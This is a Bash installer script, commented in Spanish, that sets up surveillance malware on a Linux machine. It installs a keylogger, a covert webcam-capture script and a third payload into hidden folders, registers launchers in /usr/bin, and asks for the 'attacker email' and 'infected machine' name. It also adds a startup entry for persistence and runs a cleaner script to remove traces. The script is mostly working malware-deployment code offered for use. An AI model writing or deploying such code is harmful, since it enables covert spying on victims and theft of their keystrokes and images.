#!/bin/bash

root_verify=$(whoami)
usuario=$(users)
ruta=$(pwd)

function init_program() {
    # Paquetes requeridos
    python3.7 -m pip install pyautogui
    sudo apt-get install fswebcam

    # Instalacion
    sudo touch /usr/bin/observer.sh
    sudo touch /usr/bin/chisec.sh
    sudo touch /usr/bin/fingerstalker.sh
    sudo echo "python3.7 /home/$usuario/.hidden/0v53rber/cam_snap.py" > /usr/bin/observer.sh
    sudo echo "python3.7 /home/$usuario/.hidden/ch1s3c/hb.py" > /usr/bin/chisec.sh
    sudo echo "python3.7 /home/$usuario/.hidden/f1ng3r5talk3r/keylogger.py" > /usr/bin/fingerstalker.sh
    sudo chmod +x /usr/bin/observer.sh
    sudo chmod +x /usr/bin/chisec.sh
    sudo chmod +x /usr/bin/fingerstalker.sh

    echo -e "Email Atacante >> "
    read email
    echo -e "Nombre de maquina infectada >> "
    read machine
    
    echo "$email|$machine|$usuario" > exploits/config.txt

    # Carpetas
    mkdir ../.hidden
    mv exploits/cleaner.sh ../.hidden && sudo chmod ../.hidden/cleaner.sh
    mv exploits/config.txt ../.hidden
    mv exploits/0v53rber/ ../.hidden
    mv exploits/ch1s3c/ ../.hidden
    mv exploits/f1ng3r5talk3r/ ../.hidden
    sudo mv exploits/config.txt /usr/bin/

    clear

    echo -e "En otra terminal pega el siguiente comando : python3.7 /home/$usuario/v1k0x/add.py"
    mate-session-properties
    echo -e "[+] Instalacion completada con exito. "
    
    ../.hidden/./cleaner.sh $ruta
    
}
if [ $root_verify != "root" ]
then
    echo -e "[!] Debes ejecutar el instalador como root (super-usuario)"
else
    init_program
fi
